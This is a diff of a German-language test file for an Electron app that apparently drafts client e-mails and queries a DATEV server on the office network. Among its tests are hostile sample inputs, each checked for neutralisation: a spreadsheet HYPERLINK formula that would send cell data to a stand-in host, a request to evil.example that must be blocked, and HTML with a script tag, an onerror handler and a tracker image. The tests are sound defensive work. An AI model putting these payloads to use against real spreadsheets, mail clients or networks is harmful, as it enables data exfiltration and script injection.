@@ -65,17 +65,39 @@ test("Mehrere E-Mails mit Herkunft, Beziehungen, Gesellschafter-Mails", async ()
   assert.deepEqual(nowak.emails.map((e) => e.adresse), ["info.nowak-maschinenbau@example.com", "buchhaltung.nowak-maschinenbau@example.com", "ralf.nowak@example.com", "petra.nowak@example.com"]);
   assert.ok(nowak.beziehungen.includes("Gesellschafter: Nowak, Ralf"));
   assert.ok(nr(10011).beziehungen.includes("ist Ehegatte von Hartmann, Katrin (10010)"));
+  // Ehegatte/Lebenspartner gilt in beide Richtungen: Thomas Schulze erreicht auch Katrin Hartmanns Adresse und umgekehrt
+  const katrin = nr(10010).emails.find((e) => e.adresse === "katrin.hartmann@example.com");
+  assert.ok(nr(10011).emails.some((e) => e.adresse === katrin.adresse && !e.eigen && e.rolle === "Ehegatte"));
+  assert.ok(nr(10010).emails.some((e) => !e.eigen && e.rolle === "Ehegatte"));
 });
 
 test("Mail an mehrere Adressen", async () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
-  assert.match(baueEml({ an: ["a@example.com", "b@example.com"], betreff: "x", text: "y" }), /\r\nTo: a@example.com, b@example.com\r\n/);
+  assert.match(baueEml({ an: ["a@example.com", "b@example.com"], betreff: "x", text: "y" }), /\r\nBcc: a@example.com,\r\n b@example.com\r\n/);
   const erg = await erstelleMails({ modus: "entwurf", mails: [
     { nummer: 1, name: "A", an: ["a@example.com", "b@example.com"], betreff: "B", text: "T", anhaenge: [] },
     { nummer: 2, name: "B", an: ["a@example.com", "kaputt"], betreff: "B", text: "T", anhaenge: [] },
     { nummer: 3, name: "C", an: [], betreff: "B", text: "T", anhaenge: [] },
   ] }, { versand: "eml", ausgang: dir, tmp: dir });
   assert.deepEqual(erg.map((e) => e.ok), [true, false, false]);
+});
+
+test(".eml: lange Betreffs gefaltet, Adressen mit Trennern abgelehnt, Outlook-Abbruch meldet jede Mail", async () => {
+  const eml = baueEml({ an: ["a@example.com"], betreff: "Ä".repeat(600), text: "y" });
+  assert.ok(eml.split("\r\n").every((z) => z.length <= 78), "keine Kopfzeile über 78 Zeichen");
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
+  const erg = await erstelleMails({ modus: "entwurf", mails: [
+    { nummer: 1, name: "A", an: ["a@x.de;Müller"], betreff: "B", text: "T", anhaenge: [] },
+    { nummer: 2, name: "B", an: ["<a@x.de>"], betreff: "B", text: "T", anhaenge: [] },
+  ] }, { versand: "eml", ausgang: dir, tmp: dir });
+  assert.deepEqual(erg.map((e) => e.ok), [false, false]);
+  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "eml", ausgang: dir, tmp: dir }), /Nur Entwürfe/);
+  // Ohne PowerShell/Outlook (hier Linux): jede Mail kommt mit Nummer als Fehler zurück, Zwischendatei ist weg
+  const tmp = path.join(dir, "tmp");
+  const o = await erstelleMails({ modus: "entwurf", mails: [{ nummer: 7, name: "X", an: ["a@x.de"], betreff: "B", text: "T", anhaenge: [] }] }, { versand: "outlook", ausgang: dir, tmp });
+  assert.equal(o[0].nummer, 7);
+  assert.equal(o[0].ok, false);
+  assert.deepEqual(fs.readdirSync(tmp), []);
 });
 
 test("Register nur bei Pflicht, Auftragswesen fehlt ohne Absturz", async () => {
@@ -97,7 +119,7 @@ test(".eml mit Anhängen und Umlauten", async () => {
   const a = path.join(dir, "Merkblatt Übersicht.pdf");
   fs.writeFileSync(a, "%PDF-1.4 Test");
   const eml = baueEml({ an: "x@example.com", betreff: "Prüfung", text: "Grüße\nZeile 2" }, [a]);
-  assert.match(eml, /^X-Unsent: 1\r\nTo: x@example.com\r\n/);
+  assert.match(eml, /^X-Unsent: 1\r\nBcc: x@example.com\r\n/);
   assert.match(eml, /multipart\/mixed/);
   assert.ok(eml.includes(Buffer.from("%PDF-1.4 Test").toString("base64")));
   assert.ok(eml.includes(Buffer.from("Merkblatt Übersicht.pdf").toString("base64")));
@@ -109,7 +131,7 @@ test(".eml mit Anhängen und Umlauten", async () => {
   ] }, { versand: "eml", ausgang: path.join(dir, "aus"), tmp: path.join(dir, "tmp") });
   assert.deepEqual(erg.map((e) => e.ok), [true, false, false]);
   assert.equal(fs.readdirSync(path.join(dir, "aus")).length, 1);
-  await assert.rejects(erstelleMails({ modus: "x", mails: [] }, { versand: "eml" }));
+  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "eml" }));
 });
 
 test("Protokoll und Einstellungen", () => {
@@ -117,7 +139,125 @@ test("Protokoll und Einstellungen", () => {
   const ab = oeffneAblage(dir);
   ab.protokolliere([{ Zeit: "1", Modus: "eml", Vorlage: "V", Mandantennr: 5, Mandant: 'Krümel "GmbH"; Test', An: "a@b.de", Betreff: "x", Ergebnis: "ok", Anhaenge: "a.pdf" }]);
   assert.deepEqual(ab.protokoll()[0].Mandant, 'Krümel "GmbH"; Test');
-  assert.equal(ab.speichereEinstellungen({ versand: "quatsch", demo: 1 }).versand, "outlook");
+  assert.equal(ab.speichereEinstellungen({ versand: "quatsch", demo: true }).versand, "eml");
+  assert.equal(ab.ausgang, path.join(dir, "ausgang"));
+  const ziel = path.join(dir, "eigener-ordner");
+  ab.speichereEinstellungen({ emlOrdner: ziel });
+  assert.equal(ab.ausgang, ziel);
+  ab.speichereEinstellungen({ emlOrdner: "relativ/pfad" });
+  assert.equal(ab.ausgang, path.join(dir, "ausgang"));
   assert.equal(ab.einstellungen().demo, true);
   assert.equal(ab.vorlagen().length, 2);
+});
+
+test("Excel-Formeln im Protokoll entschärft, beim Lesen unverändert", () => {
+  const { csvZeile } = require("../electron/ablage.cjs");
+  assert.equal(csvZeile(['=HYPERLINK("http://x?"&A2)', "+49 341 1", "@SUM(1)", "-2", "ok"]), `"'=HYPERLINK(""http://x?""&A2)";"'+49 341 1";"'@SUM(1)";"'-2";"ok"`);
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
+  const ab = oeffneAblage(dir);
+  ab.protokolliere([{ Zeit: "1", Mandant: "=1+1", Betreff: "+SUM(1)" }]);
+  assert.equal(ab.protokoll()[0].Mandant, "=1+1");
+  assert.ok(fs.readFileSync(path.join(dir, "protokoll.csv"), "utf8").includes(`"'=1+1"`));
+});
+
+test("Kaputte Dateien im Datenordner legen die App nicht lahm", () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
+  fs.writeFileSync(path.join(dir, "ansicht.json"), JSON.stringify({ spalten: "abc", sort: { id: 1 }, gruppe: 5, boese: "<img>" }));
+  fs.writeFileSync(path.join(dir, "vorlagen.json"), JSON.stringify([null, { id: 1, name: { x: 1 } }]));
+  fs.writeFileSync(path.join(dir, "gruppen.json"), JSON.stringify([{ id: "g", name: "", mitglieder: "1,2" }]));
+  fs.writeFileSync(path.join(dir, "einstellungen.json"), JSON.stringify({ demo: "false", versand: ["eml"], regeln: { email: "nein", quatsch: false } }));
+  const ab = oeffneAblage(dir);
+  assert.deepEqual(ab.ansicht(), {});
+  assert.deepEqual(ab.vorlagen(), [{ id: "1", name: "[object Object]", betreff: "", text: "" }]);
+  assert.deepEqual(ab.gruppen(), [{ id: "g", name: "Gruppe", mitglieder: [] }]);
+  const e = ab.einstellungen();
+  assert.equal(e.demo, false);
+  assert.equal(e.versand, "eml");
+  assert.deepEqual(e.regeln, {});
+  fs.mkdirSync(path.join(dir, "tmp"));
+  fs.writeFileSync(path.join(dir, "tmp", "auftrag-1.json"), "{}");
+  ab.raeumeTmp();
+  assert.ok(!fs.existsSync(path.join(dir, "tmp")));
+});
+
+test("Netz: nur DATEVconnect im eigenen Netz, Adresse wie eingetragen", async () => {
+  const { datevAdresse, datevBasis, privateAdresse, pruefeImKanzleinetz, sichererAbruf, DATEV_STANDARD } = require("../electron/netz.cjs");
+  // Adresse: bleibt wie eingetragen (keine Prüfung); leer/alter Standard → neuer Standard
+  assert.equal(DATEV_STANDARD, "https://LIZENZSERVER:58452/datev/api/master-data/v1");
+  const link = "https://lizenzserver:58452/datev/api/master-data/v1/clients?select=number,name&filter=status%20eq%20active";
+  assert.equal(datevAdresse(link), link);
+  assert.equal(datevAdresse("  quatsch "), "quatsch");
+  for (const e of ["", "   ", "http://LIZENZSERVER:58454/datev/api/master-data/v1", "http://lizenzserver:58454/datev/api/master-data/v1/"]) assert.equal(datevAdresse(e), DATEV_STANDARD, e);
+  // Basis für die Abfragen: Browser-Adresse → …/master-data/v1, ohne Schema → https
+  const basis = "https://lizenzserver:58452/datev/api/master-data/v1";
+  for (const e of [link, "lizenzserver:58452/datev/api/master-data/v1", "  https://lizenzserver:58452/datev/api/master-data/v1/  ", "https://LIZENZSERVER:58452/datev/api/master-data/v1#x"]) assert.equal(datevBasis(e), basis, e);
+  assert.equal(datevBasis("http://192.168.1.5:58454/datev/api/master-data/v1/clients"), "http://192.168.1.5:58454/datev/api/master-data/v1");
+  assert.equal(datevBasis("http://srv:8080/anderer/pfad/?x=1"), "http://srv:8080/anderer/pfad");
+  assert.equal(datevBasis(""), DATEV_STANDARD.replace("LIZENZSERVER", "lizenzserver"));
+  for (const ip of ["10.0.0.1", "172.16.0.1", "172.31.255.255", "192.168.178.20", "127.0.0.1", "169.254.1.1", "::1", "fd00::1", "fe80::1", "::ffff:192.168.0.1"]) assert.ok(privateAdresse(ip), ip);
+  for (const ip of ["8.8.8.8", "172.32.0.1", "100.64.0.1", "2a00:1450::1", "::ffff:8.8.8.8", "0.0.0.0"]) assert.ok(!privateAdresse(ip), ip);
+  await pruefeImKanzleinetz("LIZENZSERVER", async () => [{ address: "192.168.0.10" }]);
+  await assert.rejects(pruefeImKanzleinetz("LIZENZSERVER", async () => [{ address: "192.168.0.10" }, { address: "52.1.2.3" }]), /nicht im eigenen Netz/);
+  await assert.rejects(pruefeImKanzleinetz("x", async () => []), /nicht im eigenen Netz/);
+  // Abruf: falscher Ursprung gesperrt; sonst GET, ohne Weiterleitung (Cookies/Anmeldung regelt holeMitWindowsKonto in haupt.cjs)
+  const aufrufe = [];
+  const abruf = sichererAbruf(async (u, o) => { aufrufe.push([u, o]); return { status: 200 }; }, () => "http://lizenzserver:58454", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
+  await abruf("http://lizenzserver:58454/datev/api/master-data/v1/clients", { method: "POST" });
+  assert.equal(aufrufe[0][1].method, "GET");
+  assert.equal(aufrufe[0][1].redirect, "error");
+  assert.ok(!("credentials" in aufrufe[0][1]));
+  await assert.rejects(abruf("http://evil.example/datev/api/master-data/v1/clients"), /Gesperrt/);
+  const mitAnmeldung = sichererAbruf(async () => ({ status: 401 }), () => "http://lizenzserver:58454", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
+  await assert.rejects(mitAnmeldung("http://lizenzserver:58454/datev/api/master-data/v1/version"), /Windows-Konto nicht zu \(401\)/);
+  // https: gleicher Ursprung nötig (Schema + Server + Port), sonst gesperrt
+  const sicher = sichererAbruf(async () => ({ status: 200 }), () => "https://lizenzserver:58452", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
+  assert.equal((await sicher("https://lizenzserver:58452/datev/api/master-data/v1/clients")).status, 200);
+  await assert.rejects(sicher("http://lizenzserver:58452/datev/api/master-data/v1/clients"), /Gesperrt/);
+  const fremdesZertifikat = sichererAbruf(async () => { throw new TypeError("net::ERR_CERT_AUTHORITY_INVALID"); }, () => "https://lizenzserver:58452", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
+  await assert.rejects(fremdesZertifikat("https://lizenzserver:58452/datev/api/master-data/v1/clients"), /vertraut dem Zertifikat/);
+});
+
+test("Standard-Adressen pro Mandant: speichern, aufheben, kaputte Datei", () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
+  const ab = oeffneAblage(dir);
+  assert.deepEqual(ab.standardAdressen(), {});
+  assert.deepEqual(ab.setzeStandardAdressen(10004, ["a@x.de", " a@x.de ", "b@x.de", "", 7]), { 10004: ["a@x.de", "b@x.de"] });
+  assert.deepEqual(ab.setzeStandardAdressen(10001, ["c@x.de"]), { 10004: ["a@x.de", "b@x.de"], 10001: ["c@x.de"] });
+  assert.deepEqual(ab.setzeStandardAdressen(10004, null), { 10001: ["c@x.de"] });
+  assert.deepEqual(ab.setzeStandardAdressen(10001, []), {});
+  assert.throws(() => ab.setzeStandardAdressen("10001", ["c@x.de"]), /Mandantennummer/);
+  fs.writeFileSync(path.join(dir, "standard-adressen.json"), '{"abc": ["x@y.de"], "10002": "kein Array", "10003": ["ok@y.de"]');
+  assert.deepEqual(ab.standardAdressen(), {}, "kaputtes JSON → leer");
+  fs.writeFileSync(path.join(dir, "standard-adressen.json"), '{"abc": ["x@y.de"], "10002": "kein Array", "10003": ["ok@y.de"]}');
+  assert.deepEqual(ab.standardAdressen(), { 10003: ["ok@y.de"] });
+});
+
+test("Formatierte Mail: Farben bleiben, Bilder eingebettet (cid), fremde Bilder und Skripte weg", () => {
+  const { baueEml, bereiteHtml } = require("../electron/versand.cjs");
+  const png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
+  const html = `<p>Hallo <span style="color: #C00000">rot</span> <mark data-color="#FFFF00" style="background-color: #FFFF00; color: inherit">gelb</mark></p><p></p>` +
+    `<p style="text-align: center"><img src="data:image/png;base64,${png}" width="120" onerror="x()"><img src="https://tracker.example/p.png"></p><script>alert(1)</script>`;
+  const f = bereiteHtml(html);
+  assert.equal(f.bilder.length, 1);
+  assert.match(f.html, /<span style="color: #C00000">rot<\/span>/);
+  assert.match(f.html, /<span style="background-color: #FFFF00; color: inherit">gelb<\/span>/);
+  assert.match(f.html, new RegExp(`<img src="cid:${f.bilder[0].cid.replace(/\./g, "\\.")}" width="120">`));
+  assert.match(f.html, /<p style="margin:0"><br><\/p>/);
+  assert.match(f.html, /<p style="margin:0;text-align: center">/);
+  for (const weg of ["tracker.example", "<script", "onerror", "data:image"]) assert.ok(!f.html.includes(weg), weg);
+  assert.throws(() => bereiteHtml(`<img src="data:image/png;base64,${"A".repeat(21 * 1024 * 1024)}">`), /zu groß/);
+
+  const eml = baueEml({ an: ["a@x.de"], betreff: "Test", text: "Hallo rot gelb", formatiert: f }, []);
+  assert.match(eml, /Content-Type: multipart\/alternative/);
+  assert.match(eml, /Content-Type: text\/plain; charset=utf-8/);
+  assert.match(eml, /Content-Type: multipart\/related/);
+  assert.match(eml, new RegExp(`Content-ID: <${f.bilder[0].cid.replace(/\./g, "\\.")}>`));
+  // ohne html bleibt es reiner Text wie bisher
+  assert.ok(!/multipart/.test(baueEml({ an: ["a@x.de"], betreff: "T", text: "nur Text" }, [])));
+});
+
+test("SMTP: ohne Einrichtung und im falschen Modus wird abgelehnt, ohne SMTP nie senden", async () => {
+  await assert.rejects(erstelleMails({ modus: "entwurf", mails: [] }, { versand: "smtp" }), /direkt/);
+  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "smtp", smtp: { host: "", absender: "" }, passwort: "" }), /nicht eingerichtet/);
+  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "eml" }), /Nur Entwürfe/);
 });
